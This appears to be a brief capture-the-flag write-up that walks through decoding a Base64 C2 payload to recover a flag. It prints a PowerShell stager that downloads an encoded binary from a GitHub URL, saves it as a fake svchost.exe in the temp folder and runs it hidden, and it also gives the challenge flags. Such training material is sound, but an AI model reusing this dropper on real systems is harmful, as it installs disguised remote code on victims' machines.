<img width="331" height="382" alt="Screenshot 2026-07-12 083739" src="https://github.com/user-attachments/assets/3ab47089-694d-43d8-a95b-bd5c55ede2ae" />


Step 1: The answer for the Aduhai is:

<li>C2=https://gist.githubusercontent.com/WazuX/94751d2979809d44309f3126b93c2cad/raw/muehehe.txt
BEACON=OPUCC{d3c0d3d_th3_c2_1n_25_l4y3rs}</li>

Step 2: Open the github link

Step 3: Decode the Base64 text in the link

Step 4: Output is:

$ErrorActionPreference="SilentlyContinue"
$cid="OPUCC{Du_B1st_GUt_G3nuuuGgg!!!}"
$u="https://raw.githubusercontent.com/WazuX/OIIA/refs/heads/main/DuBistGutGenug.bin"
$p="$env:TEMP\svchost.exe"
$b64 = (New-Object Net.WebClient).DownloadString($u)
[IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($b64))
Start-Process -WindowStyle Hidden $p

Step 5: Flag is after $cid="
